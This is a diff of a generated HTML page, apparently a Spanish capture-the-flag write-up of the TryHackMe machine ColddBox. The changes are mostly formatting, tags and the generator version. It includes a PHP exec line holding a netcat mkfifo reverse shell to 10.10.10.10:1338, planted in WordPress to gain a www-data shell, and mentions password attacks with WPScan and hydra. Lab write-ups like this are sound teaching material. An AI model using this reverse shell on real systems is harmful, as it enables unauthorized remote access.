@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="ColddBox: Easy es una maquina de TryHackMe, realizamos un ataque de contraseñas en WordPress con usuariois encontrados en WPScan, lo que nos dio acceso a la maquina. Realizamos movimiento lateral con credenciales encontradas en archivo de configuracion de WordPress. Para escalar privilegios encontramos multiples opciones.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.80.0" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1591,16 +1591,16 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/sudo-privesc/" class="single__tag" title="sudo privesc">sudo privesc</a></li>
+  <li><a href="https://sckull.github.io/tags/wordpress/" class="single__tag" title="wordpress">wordpress</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/wordpress/" class="single__tag" title="wordpress">wordpress</a></li>
+  <li><a href="https://sckull.github.io/tags/hydra/" class="single__tag" title="hydra">hydra</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/wpscan/" class="single__tag" title="wpscan">wpscan</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/hydra/" class="single__tag" title="hydra">hydra</a></li>
+  <li><a href="https://sckull.github.io/tags/sudo-privesc/" class="single__tag" title="sudo privesc">sudo privesc</a></li>
   
 
 </ul>
@@ -1777,7 +1777,7 @@ kali@kali:~/thm/colddbox$
 <span class="o">[</span>... snip ...<span class="o">]</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="gobuster-">GOBUSTER</h2>
+</div><h2 id="gobuster">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1821,7 +1821,7 @@ kali@kali:~/thm/colddbox$
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;<span class="err">&amp;</span>1|nc 10.10.10.10 1338 &gt;/tmp/f&#39;);
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1338 &gt;/tmp/f&#39;</span><span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>&ldquo;Ejecutamos&rdquo; nuestra shell generando un &ldquo;error&rdquo; en la pagina, en mi caso <em>cambiando el numero de Post a 2 en la URL para generar un error</em>, logrando obtener una shell con el usuario <code>www-data</code>.</p>
@@ -1851,24 +1851,24 @@ kali@kali:~/thm/colddbox$
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php:wp-config.php" data-lang="php:wp-config.php">// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define(&#39;DB_NAME&#39;, &#39;[REDACTED]&#39;);
+<pre class="chroma"><code class="language-php:wp-config.php" data-lang="php:wp-config.php"><span class="c1">// ** MySQL settings - You can get this info from your web host ** //
+</span><span class="c1"></span><span class="sd">/** The name of the database for WordPress */</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;[REDACTED]&#39;</span><span class="p">);</span>
 
-/** MySQL database username */
-define(&#39;DB_USER&#39;, &#39;[REDACTED]&#39;);
+<span class="sd">/** MySQL database username */</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;[REDACTED]&#39;</span><span class="p">);</span>
 
-/** MySQL database password */
-define(&#39;DB_PASSWORD&#39;, &#39;[REDACTED]&#39;);
+<span class="sd">/** MySQL database password */</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;[REDACTED]&#39;</span><span class="p">);</span>
 
-/** MySQL hostname */
-define(&#39;DB_HOST&#39;, &#39;localhost&#39;);
+<span class="sd">/** MySQL hostname */</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
 
-/** Database Charset to use in creating database tables. */
-define(&#39;DB_CHARSET&#39;, &#39;utf8&#39;);
+<span class="sd">/** Database Charset to use in creating database tables. */</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_CHARSET&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
 
-/** The Database Collate type. Don&#39;t change this if in doubt. */
-define(&#39;DB_COLLATE&#39;, &#39;&#39;);
+<span class="sd">/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DB_COLLATE&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
 
 </code></pre></td></tr></table>
 </div>
@@ -3306,7 +3306,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#nmap">NMAP</a></li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#gobuster">GOBUSTER</a></li>
       </ul>
     </li>
     <li><a href="#www-data---user">WWW-DATA - USER</a></li>
